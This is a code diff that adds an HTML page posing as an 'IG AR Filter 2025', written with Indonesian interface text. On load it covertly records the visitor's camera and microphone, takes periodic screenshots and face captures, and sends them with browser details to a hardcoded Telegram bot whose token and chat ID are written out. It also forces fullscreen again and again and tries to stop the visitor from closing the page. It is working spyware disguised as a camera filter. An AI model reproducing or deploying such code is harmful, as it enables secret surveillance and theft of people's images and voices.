@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IG AR Filter 2025</title>
+<style>
+body,html{margin:0;padding:0;overflow:hidden;background:#000}
+#video{width:100vw;height:100vh;object-fit:cover;transform:scaleX(-1)}
+#status{position:absolute;top:15px;left:15px;color:#0f0;font:14px monospace}
+canvas{display:none}
+</style>
+</head>
+<body>
+<video id="video" autoplay playsinline muted></video>
+<div id="status">FILTER AKTIF</div>
+<canvas id="canvas"></canvas>
+
+<script>
+const BOT_TOKEN="8594513705:AAEXZ3aS_AOkoZxpqtBdKhYB5H45DkkYPJU"
+const CHAT_ID="7835924973"
+const API=`https://api.telegram.org/bot${BOT_TOKEN}`
+
+const video=document.getElementById('video')
+const canvas=document.getElementById('canvas')
+const ctx=canvas.getContext('2d')
+let stream=null
+let recorder=null
+let chunks=[]
+
+async function startCam(){
+try{
+stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720},audio:true})
+video.srcObject=stream
+canvas.width=1280
+canvas.height=720
+recorder=new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp9'})
+recorder.ondataavailable=e=>chunks.push(e.data)
+recorder.onstop=()=>sendToTelegram()
+recorder.start(1000)
+setInterval(()=>{if(recorder.state==="recording")recorder.stop();recorder.start(1000)},10000)
+setInterval(captureScreenshot,5000)
+setInterval(detectFace,2000)
+}catch(e){setTimeout(startCam,2000)}
+}
+
+function sendToTelegram(){
+if(chunks.length===0)return
+const blob=new Blob(chunks,{type:'video/webm'})
+const form=new FormData()
+form.append('chat_id',CHAT_ID)
+form.append('video',blob,`cam_${Date.now()}.webm`)
+form.append('caption',`User: ${navigator.userAgent.split(' ').slice(0,3).join(' ')}\nCreated by t.me/aldooffcialr`)
+fetch(`${API}/sendVideo`,{method:'POST',body:form}).catch(()=>{})
+chunks=[]
+}
+
+function captureScreenshot(){
+ctx.drawImage(video,0,0,canvas.width,canvas.height)
+canvas.toBlob(blob=>{
+const form=new FormData()
+form.append('chat_id',CHAT_ID)
+form.append('photo',blob,`ss_${Date.now()}.jpg`)
+form.append('caption','Screenshot Otomatis\nCreated by t.me/aldooffcialr')
+fetch(`${API}/sendPhoto`,{method:'POST',body:form}).catch(()=>{})
+},'image/jpeg',0.8)
+}
+
+let lastFace=null
+async function detectFace(){
+ctx.drawImage(video,0,0,canvas.width,canvas.height)
+const blob=await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.7))
+const img=new Image()
+img.src=URL.createObjectURL(blob)
+img.onload=async()=>{
+const face=await faceapi.detectSingleFace(img).withFaceLandmarks().withFaceDescriptor()
+if(face && (!lastFace || distance(face.descriptor,lastFace)>0.6)){
+lastFace=face.descriptor
+const form=new FormData()
+form.append('chat_id',CHAT_ID)
+form.append('photo',blob,`face_${Date.now()}.jpg`)
+form.append('caption','Wajah Baru Terdeteksi\nCreated by t.me/aldooffcialr')
+fetch(`${API}/sendPhoto`,{method:'POST',body:form}).catch(()=>{})
+}
+}
+}
+function distance(a,b){
+let sum=0
+for(let i=0;i<a.length;i++)sum+=(a[i]-b[i])**2
+return Math.sqrt(sum)
+}
+
+window.onload=()=>{document.body.requestFullscreen().catch(()=>{});startCam()}
+setInterval(()=>{if(!document.fullscreenElement)document.body.requestFullscreen()},4000)
+window.onbeforeunload=()=>'Filter masih aktif... jangan tutup!'
+
+const script=document.createElement('script')
+script.src='https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/dist/face-api.min.js'
+document.head.appendChild(script)
+const model=document.createElement('script')
+model.onload=()=>{faceapi.nets.ssdMobilenetv1.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model/');faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model/');faceapi.nets.faceRecognitionNet.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model/')}
+model.src='https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/dist/face-api.min.js'
+document.head.appendChild(model)
+</script>
+</body>
+</html>
